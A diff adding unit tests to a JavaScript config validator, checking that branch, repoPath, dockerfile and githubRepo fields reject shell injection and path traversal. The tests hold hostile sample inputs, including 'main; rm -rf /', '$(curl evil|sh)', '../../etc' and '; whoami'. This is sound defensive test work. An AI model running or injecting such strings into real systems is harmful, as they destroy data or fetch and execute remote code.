@@ -67,6 +67,23 @@ test('rejects missing required field', () => {
   assert.strictEqual(r.valid, false);
 });
 
+test('rejects shell metacharacters in branch (injection guard)', () => {
+  assert.strictEqual(validate({ ...valid, source: { branch: 'main; rm -rf /' } }).valid, false);
+  assert.strictEqual(validate({ ...valid, source: { branch: '$(curl evil|sh)' } }).valid, false);
+  assert.strictEqual(validate({ ...valid, source: { branch: 'feature/x-1.2' } }).valid, true);
+});
+
+test('rejects path traversal in repoPath / dockerfile', () => {
+  assert.strictEqual(validate({ ...valid, source: { repoPath: '../../etc' } }).valid, false);
+  assert.strictEqual(validate({ ...valid, runtime: { type: 'docker', dockerfile: '../../x' } }).valid, false);
+  assert.strictEqual(validate({ ...valid, source: { repoPath: 'services/api' } }).valid, true);
+});
+
+test('rejects a malformed githubRepo', () => {
+  assert.strictEqual(validate({ ...valid, source: { githubRepo: 'not a repo; whoami' } }).valid, false);
+  assert.strictEqual(validate({ ...valid, source: { githubRepo: 'acme/widgets' } }).valid, true);
+});
+
 console.log('\nreserved env catalog');
 
 test('internal everything: db url is auto, not user-required', () => {
